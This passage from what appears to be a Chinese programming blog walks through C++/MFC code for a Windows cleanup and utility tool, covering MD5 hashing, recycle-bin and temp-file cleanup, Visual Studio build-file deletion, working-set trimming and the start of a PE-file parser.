class="line"><span class="literal">NULL</span>,<span class="comment">// 默认栈的大小(局部变量、参数、返回地址)</span></span><br><span class="line">(LPTHREAD_START_ROUTINE)MD5Call,<span class="comment">// 线程代码的起始位置</span></span><br><span class="line"><span class="keyword">this</span>,<span class="comment">// 线程函数的参数，如果传递的是地址，那么需要保证这块内存地址的生命周期（不能是局部变量）</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">// 创建标志</span></span><br><span class="line"><span class="literal">NULL</span>);<span class="comment">// 传出的线程ID</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">WaitForSingleObject(ThreadT,<span class="number">-1</span>);</span><br><span class="line">m_strMd5.SetString(m_chex);</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">m_strMd5.SetString(<span class="string">L&quot;文件过大，无法计算&quot;</span>);</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="计算MD5值（需要保护openssl）"><a href="#计算MD5值（需要保护openssl）" class="headerlink" title="计算MD5值（需要保护openssl）"></a>计算MD5值（需要保护openssl）</h3><p>#include &lt;openssl/md5.h&gt;<br>#pragma comment(lib,”res/libcrypto.lib”)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//计算md5</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">CMyFileSelectDlg::md5_Value</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* data, <span class="keyword">size_t</span> len, <span class="keyword">unsigned</span> <span class="keyword">char</span>* md5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 初始化保存 md5 信息的结构体</span></span><br><span class="line">MD5_CTX ctx = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">MD5_Init(&amp;ctx);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将需要计算的数据传入到对应的结构中</span></span><br><span class="line">MD5_Update(&amp;ctx, data, len);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从结构中获取计算后的结果</span></span><br><span class="line">MD5_Final(md5, &amp;ctx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="转换成我们看的懂的16进制"><a href="#转换成我们看的懂的16进制" class="headerlink" title="转换成我们看的懂的16进制"></a>转换成我们看的懂的16进制</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//转换为大端16进制</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyFileSelectDlg::show_hex</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* n, <span class="keyword">unsigned</span> <span class="keyword">char</span>* hex, <span class="keyword">size_t</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CString cs;</span><br><span class="line">m_chex = <span class="string">L&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; ++i)</span><br><span class="line">&#123;</span><br><span class="line">cs.Format(<span class="string">L&quot;%2X&quot;</span>, hex[i]);</span><br><span class="line">m_chex += cs;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="文件清理"><a href="#文件清理" class="headerlink" title="文件清理"></a>文件清理</h1><h2 id="清空活回收站"><a href="#清空活回收站" class="headerlink" title="清空活回收站"></a>清空活回收站</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//清空回收站</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMySystemDlg::Recycle</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">SHQUERYRBINFO Recycle = &#123;&#125;;</span><br><span class="line">Recycle.cbSize = <span class="keyword">sizeof</span>(Recycle);</span><br><span class="line">SHQueryRecycleBin(<span class="literal">NULL</span>,&amp;Recycle);</span><br><span class="line">SHEmptyRecycleBin(<span class="literal">NULL</span>,<span class="literal">NULL</span>,SHERB_NOCONFIRMATION|SHERB_NOPROGRESSUI|SHERB_NOSOUND);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="VS工程清理"><a href="#VS工程清理" class="headerlink" title="VS工程清理"></a>VS工程清理</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vs工程查找</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMySystemDlg::OnBnClickedCleanbuttonvs</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (filePath != <span class="string">L&quot;&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> pDecs1[][<span class="number">20</span>] = &#123;</span><br><span class="line"><span class="string">&quot;.exe&quot;</span>,</span><br><span class="line"><span class="string">&quot;.obj&quot;</span>,</span><br><span class="line"><span class="string">&quot;.tlog&quot;</span>,</span><br><span class="line"><span class="string">&quot;.idb&quot;</span>,</span><br><span class="line"><span class="string">&quot;.pdb&quot;</span>,</span><br><span class="line"><span class="string">&quot;.pch&quot;</span>,</span><br><span class="line"><span class="string">&quot;.res&quot;</span>,</span><br><span class="line"><span class="string">&quot;.ilk&quot;</span>,</span><br><span class="line"><span class="string">&quot;.sdf&quot;</span>,</span><br><span class="line"><span class="string">&quot;.ipch&quot;</span>,</span><br><span class="line"><span class="string">&quot;.log&quot;</span>,</span><br><span class="line"><span class="string">&quot;.lastbuildstate&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xc</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="keyword">sizeof</span>(pDecs[i]); j++)</span><br><span class="line">&#123;</span><br><span class="line">pDecs[i][j] = pDecs1[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">EnumFile(filePath);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBox(<span class="string">L&quot;请先把需要清理的VS工程文件拖入本程序&quot;</span>,<span class="string">L&quot;提示&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="文件遍历"><a href="#文件遍历" class="headerlink" title="文件遍历"></a>文件遍历</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//文件遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMySystemDlg::EnumFile</span><span class="params">(CString filePath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CString csPath;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">CString cs;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拼接完整路径</span></span><br><span class="line">CString fullPath = filePath + <span class="string">L&quot;\\*&quot;</span>;</span><br><span class="line"><span class="comment">// 查找第一个文件</span></span><br><span class="line">WIN32_FIND_DATA fileData = &#123;&#125;;</span><br><span class="line">HANDLE hFile = FindFirstFile(fullPath, &amp;fileData);</span><br><span class="line"><span class="keyword">if</span> (hFile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 输出文件的信息，</span></span><br><span class="line"><span class="comment">// 过滤两个文件夹……</span></span><br><span class="line"><span class="keyword">if</span> (wcscmp(fileData.cFileName, <span class="string">L&quot;.&quot;</span>) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(fileData.cFileName, <span class="string">L&quot;..&quot;</span>) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果找到的是目录，递归遍历目录中的其他文件</span></span><br><span class="line"><span class="keyword">if</span> (fileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">&#123;</span><br><span class="line">EnumFile(filePath + <span class="string">L&quot;\\&quot;</span> + fileData.cFileName);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取文件大小</span></span><br><span class="line">DWORD dwSize = (fileData.nFileSizeHigh * (MAXDWORD + <span class="number">1</span>))</span><br><span class="line">+ fileData.nFileSizeLow;</span><br><span class="line"><span class="comment">// 转换成字符串格式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="keyword">sizeof</span>(pDecs); j++)</span><br><span class="line">&#123;</span><br><span class="line">cs = pDecs[j];</span><br><span class="line"><span class="keyword">if</span> (wcscmp(cs, PathFindExtension(fileData.cFileName)) == <span class="number">0</span></span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//保存路径到vector中</span></span><br><span class="line">csPath.Format(<span class="string">L&quot;%s\\%s&quot;</span>, filePath, fileData.cFileName);</span><br><span class="line"></span><br><span class="line">vecPath.push_back(csPath);<span class="comment">//将路径加入vector</span></span><br><span class="line">m_objInputInfo.InsertItem(i, <span class="string">L&quot;&quot;</span>);</span><br><span class="line">m_objInputInfo.SetItemText(i, <span class="number">1</span>, filePath + <span class="string">L&quot;\\&quot;</span> + fileData.cFileName);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">i++;</span><br><span class="line"><span class="comment">// 继续遍历下一个文件</span></span><br><span class="line">&#125; <span class="keyword">while</span> (FindNextFile(hFile, &amp;fileData));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Vs文件删除</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMySystemDlg::OnBnClickedButton1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!(vecPath.size() == <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> Error;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; vecPath.size(); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//1. 删除文件</span></span><br><span class="line">Error = DeleteFile(vecPath[i]);<span class="comment">//error等于0说明清理成功</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Error)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//m_FileList2.SetItemText(i, 1, L&quot;清理成功&quot;);</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; vecPath.size(); i++)</span><br><span class="line">&#123;</span><br><span class="line">m_objInputInfo.DeleteItem(<span class="number">1</span>);</span><br><span class="line">Sleep(<span class="number">30</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vecPath.empty();</span><br><span class="line">m_objInputInfo.InsertItem(<span class="number">1</span>, <span class="string">L&quot;&quot;</span>);</span><br><span class="line">m_objInputInfo.SetItemText(<span class="number">1</span>, <span class="number">1</span>, <span class="string">L&quot;清理成功&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBox(<span class="string">L&quot;请先点击VS工程获取按钮&quot;</span>, <span class="string">L&quot;提示&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="系统缓存"><a href="#系统缓存" class="headerlink" title="系统缓存"></a>系统缓存</h2><h3 id="缓存查找"><a href="#缓存查找" class="headerlink" title="缓存查找"></a>缓存查找</h3><p>我这里就使用了三个路径</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//系统缓存查找</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMySystemDlg::OnBnClickedCleanbuttonsy</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">CString sPath;</span><br><span class="line">CString csCleanPath;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取//L&quot;C:\\Users\\hugan\\AppData\\Local\\Temp&quot;路径 （用户临时文件）</span></span><br><span class="line">SHGetFolderPath(<span class="literal">NULL</span>, CSIDL_LOCAL_APPDATA, <span class="literal">NULL</span>, <span class="number">0</span>, sPath.GetBuffer());<span class="comment">//L&quot;C:\\Users\\hugan\\AppData\\Local&quot;</span></span><br><span class="line"></span><br><span class="line">csCleanPath.Format(<span class="string">L&quot;%s%s&quot;</span>, sPath, <span class="string">L&quot;\\Temp&quot;</span>);</span><br><span class="line"></span><br><span class="line">csSystem[<span class="number">0</span>] = csCleanPath;</span><br><span class="line"></span><br><span class="line">csCleanPath.Format(<span class="string">L&quot;%s%s&quot;</span>, sPath, <span class="string">L&quot;\\Microsoft\\Windows\\WER\\ReportQueue&quot;</span>);</span><br><span class="line">csSystem[<span class="number">1</span>] = csCleanPath;<span class="comment">//Windows错误报告</span></span><br><span class="line">sPath.ReleaseBuffer();</span><br><span class="line"><span class="comment">//获取L&quot;C:\\WINDOWS\\Temp&quot;路径  （系统临时文件）</span></span><br><span class="line">SHGetFolderPath(<span class="literal">NULL</span>, CSIDL_WINDOWS, <span class="literal">NULL</span>, <span class="number">0</span>, sPath.GetBuffer(MAX_PATH));<span class="comment">//L&quot;C:\\WINDOWS&quot;</span></span><br><span class="line"></span><br><span class="line">csCleanPath.Format(<span class="string">L&quot;%s%s&quot;</span>, sPath, <span class="string">L&quot;\\Temp&quot;</span>);</span><br><span class="line">csSystem[<span class="number">2</span>] = csCleanPath;</span><br><span class="line">sPath.ReleaseBuffer();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建线程</span></span><br><span class="line">HANDLE Thread = CreateThread(</span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">// 线程的安全属性</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">// 默认栈的大小(局部变量、参数、返回地址)</span></span><br><span class="line">(LPTHREAD_START_ROUTINE)SystemCleanBack,<span class="comment">// 线程代码的起始位置</span></span><br><span class="line"><span class="keyword">this</span>,<span class="comment">// 线程函数的参数，如果传递的是地址，那么需要保证这块内存地址的生命周期（不能是局部变量）</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">// 创建标志</span></span><br><span class="line"><span class="literal">NULL</span>);<span class="comment">// 传出的线程ID</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//系统缓存回调函数所用参数</span></span><br><span class="line">CString csSystem[<span class="number">3</span>];</span><br><span class="line"><span class="built_in">vector</span>&lt;CString&gt;vecCleanPath;</span><br><span class="line"><span class="comment">//系统缓存回调函数</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">SystemCleanBack</span><span class="params">(LPARAM lparam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CMySystemDlg* pObj = (CMySystemDlg*)lparam;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">pObj-&gt;SystemClean(csSystem[i]);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="文件遍历-1"><a href="#文件遍历-1" class="headerlink" title="文件遍历"></a>文件遍历</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMySystemDlg::SystemClean</span><span class="params">(CString csPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CString csFilePath;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">CString fullPath = csPath + <span class="string">L&quot;\\*&quot;</span>;</span><br><span class="line"><span class="comment">// 查找第一个文件</span></span><br><span class="line">WIN32_FIND_DATA fileData = &#123;&#125;;</span><br><span class="line">HANDLE hFile = FindFirstFile(fullPath, &amp;fileData);</span><br><span class="line"><span class="keyword">if</span> (hFile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 输出文件的信息，</span></span><br><span class="line"><span class="comment">// 过滤两个文件夹……</span></span><br><span class="line"><span class="keyword">if</span> (wcscmp(fileData.cFileName, <span class="string">L&quot;.&quot;</span>) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(fileData.cFileName, <span class="string">L&quot;..&quot;</span>) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果找到的是目录，递归遍历目录中的其他文件</span></span><br><span class="line"><span class="keyword">if</span> (fileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">SystemClean(csPath + <span class="string">L&quot;\\&quot;</span> + fileData.cFileName);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//保存路径到vector中</span></span><br><span class="line">csFilePath = csPath + <span class="string">L&quot;\\&quot;</span> + fileData.cFileName;</span><br><span class="line"><span class="comment">//csPath.Format(L&quot;%s%s&quot;, csSystem[j], fileData.cFileName);</span></span><br><span class="line">vecCleanPath.push_back(csFilePath);<span class="comment">//将路径加入vector</span></span><br><span class="line"><span class="comment">//cs.Format(L&quot;%d&quot;, i);</span></span><br><span class="line">m_objInputInfo.InsertItem(i, <span class="string">L&quot;&quot;</span>);</span><br><span class="line">m_objInputInfo.SetItemText(i, <span class="number">1</span>, csFilePath);</span><br><span class="line">i++;</span><br><span class="line"><span class="comment">// 继续遍历下一个文件</span></span><br><span class="line">&#125; <span class="keyword">while</span> (FindNextFile(hFile, &amp;fileData));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="内存优化（类似于一键加速）"><a href="#内存优化（类似于一键加速）" class="headerlink" title="内存优化（类似于一键加速）"></a>内存优化（类似于一键加速）</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//内存优化</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMySystemDlg::GetMemStatus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">MEMORYSTATUSEX stcMemStatusEx = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">stcMemStatusEx.dwLength = <span class="keyword">sizeof</span>(stcMemStatusEx);</span><br><span class="line">GlobalMemoryStatusEx(&amp;stcMemStatusEx);</span><br><span class="line">DWORDLONG preUsedMem = stcMemStatusEx.ullTotalPhys - stcMemStatusEx.ullAvailPhys;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.清理内存</span></span><br><span class="line"></span><br><span class="line">DWORD dwPIDList[<span class="number">1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD bufSize = <span class="keyword">sizeof</span>(dwPIDList); </span><br><span class="line">DWORD dwNeedSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">EnumProcesses(dwPIDList, bufSize, &amp;dwNeedSize);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; dwNeedSize / <span class="keyword">sizeof</span>(DWORD); i++)</span><br><span class="line">&#123;</span><br><span class="line">HANDLE hProcess = OpenProcess(PROCESS_SET_QUOTA, <span class="literal">false</span>, dwPIDList[i]);</span><br><span class="line"></span><br><span class="line">SetProcessWorkingSetSize(hProcess, <span class="number">-1</span>, <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//3.获取清理后的内存状态</span></span><br><span class="line"></span><br><span class="line">GlobalMemoryStatusEx(&amp;stcMemStatusEx); DWORDLONG afterCleanUsedMem;</span><br><span class="line"></span><br><span class="line">stcMemStatusEx.ullTotalPhys - stcMemStatusEx.ullAvailPhys;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="LOAD-PE解析"><a href="#LOAD-PE解析" class="headerlink" title="LOAD_PE解析"></a>LOAD_PE解析</h1><h2 id="初始化-1"><a href="#初始化-1" class="headerlink" title="初始化"></a>初始化</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">/响应文件拖拽</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyLoadPeDlg::OnDropFiles</span><span class="params">(HDROP hDropInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 存放文件路径</span></span><br><span class="line"><span class="keyword">wchar_t</span> filePath[MAX_PATH] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取拖拽文件的路径</span></span><br><span class="line">DragQueryFile(hDropInfo, <span class="number">0</span>, filePath, MAX_PATH);</span><br><span class="line"></span><br><span class="line">WCHAR* wFilePath = filePath;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1 打开文件</span></span><br><span class="line">HANDLE hFile = CreateFile(</span><br><span class="line">wFilePath,</span><br><span class="line">GENERIC_ALL,</span><br><span class="line"><span 